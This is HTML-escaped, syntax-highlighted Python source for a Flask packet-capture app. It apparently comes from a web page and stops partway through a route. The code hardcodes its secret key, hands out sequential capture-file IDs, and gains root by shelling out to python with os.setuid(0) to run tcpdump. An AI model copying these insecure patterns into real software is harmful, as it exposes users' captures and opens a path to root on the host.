&lt;span class=&#34;n&#34;&gt;app&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;config&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;TEMPLATES_AUTO_RELOAD&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;True&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;app&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;secret_key&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x81\x02&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x18\\&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;a0ej&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x06\xec\x91&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;7y*&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x04&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;Y&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x83&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\xeb&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;C&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\xee\xab\xcf\xac&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x8d&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x8b&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\xc4\x15&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;limiter&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Limiter&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;app&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;key_func&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;get_remote_address&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;default_limits&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;99999999999999999 per day&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;99999999999999999999 per hour&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;])&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;pcapid&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;lock&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;False&lt;/span&gt;

&lt;span class=&#34;nd&#34;&gt;@app&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;before_first_request&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;get_file_id&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;():&lt;/span&gt;
      &lt;span class=&#34;k&#34;&gt;global&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pcapid&lt;/span&gt;
      &lt;span class=&#34;n&#34;&gt;path&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;os&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;path&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;join&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;app&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;root_path&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;upload&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
      &lt;span class=&#34;n&#34;&gt;onlyfiles&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;f&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;f&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;os&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;listdir&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;path&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;os&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;path&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;isfile&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;os&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;path&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;join&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;path&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))]&lt;/span&gt;
      &lt;span class=&#34;n&#34;&gt;ints&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[]&lt;/span&gt;
      &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;x&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;onlyfiles&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
              &lt;span class=&#34;k&#34;&gt;try&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
                      &lt;span class=&#34;n&#34;&gt;ints&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;append&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;replace&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;.pcap&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)))&lt;/span&gt;
              &lt;span class=&#34;k&#34;&gt;except&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
                      &lt;span class=&#34;k&#34;&gt;pass&lt;/span&gt;
      &lt;span class=&#34;k&#34;&gt;try&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
              &lt;span class=&#34;n&#34;&gt;pcapid&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;max&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ints&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;
      &lt;span class=&#34;k&#34;&gt;except&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
              &lt;span class=&#34;n&#34;&gt;pcapid&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;


&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;get_appid&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;():&lt;/span&gt;
      &lt;span class=&#34;k&#34;&gt;global&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pcapid&lt;/span&gt;
      &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pcapid&lt;/span&gt;

&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;increment_appid&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;():&lt;/span&gt;
      &lt;span class=&#34;k&#34;&gt;global&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pcapid&lt;/span&gt;
      &lt;span class=&#34;n&#34;&gt;pcapid&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;

&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;get_lock&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;():&lt;/span&gt;
      &lt;span class=&#34;k&#34;&gt;global&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;lock&lt;/span&gt;
      &lt;span class=&#34;k&#34;&gt;while&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;lock&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
              &lt;span class=&#34;k&#34;&gt;pass&lt;/span&gt;
      &lt;span class=&#34;n&#34;&gt;lock&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;True&lt;/span&gt;

&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;release_lock&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;():&lt;/span&gt;
      &lt;span class=&#34;k&#34;&gt;global&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;lock&lt;/span&gt;
      &lt;span class=&#34;n&#34;&gt;lock&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;False&lt;/span&gt;

&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;process_pcap&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;pcap_path&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
      &lt;span class=&#34;n&#34;&gt;reader&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;dpkt&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;pcap&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Reader&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;open&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;pcap_path&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;rb&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
      &lt;span class=&#34;n&#34;&gt;counter&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;
      &lt;span class=&#34;n&#34;&gt;ipcounter&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;
      &lt;span class=&#34;n&#34;&gt;tcpcounter&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;
      &lt;span class=&#34;n&#34;&gt;udpcounter&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;

      &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ts&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pkt&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;reader&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
              &lt;span class=&#34;n&#34;&gt;counter&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;
              &lt;span class=&#34;n&#34;&gt;eth&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dpkt&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ethernet&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Ethernet&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;pkt&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;

              &lt;span class=&#34;k&#34;&gt;try&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
                      &lt;span class=&#34;n&#34;&gt;ip&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dpkt&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ip&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;IP&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;eth&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
              &lt;span class=&#34;k&#34;&gt;except&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
                      &lt;span class=&#34;k&#34;&gt;continue&lt;/span&gt;

              &lt;span class=&#34;n&#34;&gt;ipcounter&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;

              &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ip&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;==&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
                      &lt;span class=&#34;n&#34;&gt;tcpcounter&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;

              &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ip&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;==&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dpkt&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ip&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;IP_PROTO_UDP&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
                      &lt;span class=&#34;n&#34;&gt;udpcounter&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;

      &lt;span class=&#34;n&#34;&gt;data&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{}&lt;/span&gt;
      &lt;span class=&#34;n&#34;&gt;data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Number of Packets&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;counter&lt;/span&gt;
      &lt;span class=&#34;n&#34;&gt;data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Number of IP Packets&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ipcounter&lt;/span&gt;
      &lt;span class=&#34;n&#34;&gt;data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Number of TCP Packets&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;  &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;tcpcounter&lt;/span&gt;
      &lt;span class=&#34;n&#34;&gt;data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Number of UDP Packets&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;  &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;udpcounter&lt;/span&gt;
      &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;data&lt;/span&gt;


&lt;span class=&#34;nd&#34;&gt;@app&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;route&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;/&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;index&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;():&lt;/span&gt;
      &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;render_template&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;index.html&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;n&#34;&gt;PCAP_MAGIC_BYTES&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\xa1\xb2\xc3\xd4&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\xd4\xc3\xb2\xa1&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x0a\x0d\x0d\x0a&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;

&lt;span class=&#34;nd&#34;&gt;@app&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;route&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;/capture&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;nd&#34;&gt;@limiter&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;limit&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;10 per minute&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;capture&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;():&lt;/span&gt;

      &lt;span class=&#34;n&#34;&gt;get_lock&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
      &lt;span class=&#34;n&#34;&gt;pcapid&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;get_appid&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
      &lt;span class=&#34;n&#34;&gt;increment_appid&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
      &lt;span class=&#34;n&#34;&gt;release_lock&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;

      &lt;span class=&#34;n&#34;&gt;path&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;os&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;path&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;join&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;app&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;root_path&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;upload&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;pcapid&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;.pcap&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
      &lt;span class=&#34;n&#34;&gt;ip&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;request&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;remote_addr&lt;/span&gt;
      &lt;span class=&#34;c1&#34;&gt;# permissions issues with gunicorn and threads. hacky solution for now.&lt;/span&gt;
      &lt;span class=&#34;c1&#34;&gt;#os.setuid(0)&lt;/span&gt;
      &lt;span class=&#34;c1&#34;&gt;#command = f&amp;#34;timeout 5 tcpdump -w {path} -i any host {ip}&amp;#34;&lt;/span&gt;
      &lt;span class=&#34;n&#34;&gt;command&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;sa&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&amp;#34;python3 -c &amp;#39;import os; os.setuid(0); os.system(&amp;#34;timeout 5 tcpdump -w &lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;path&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt; -i any host &lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ip&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;)&amp;#39;&amp;#34;&amp;#34;&amp;#34;&lt;/span&gt;
      &lt;span class=&#34;n&#34;&gt;os&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;system&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;command&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
      &lt;span class=&#34;c1&#34;&gt;#os.setuid(1000)&lt;/span&gt;

      &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;redirect&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;/data/&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;pcapid&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;

&lt;span class=&#34;nd&#34;&gt;@app&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;route&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;/ip&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;ifconfig&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;():&lt;/span&gt;
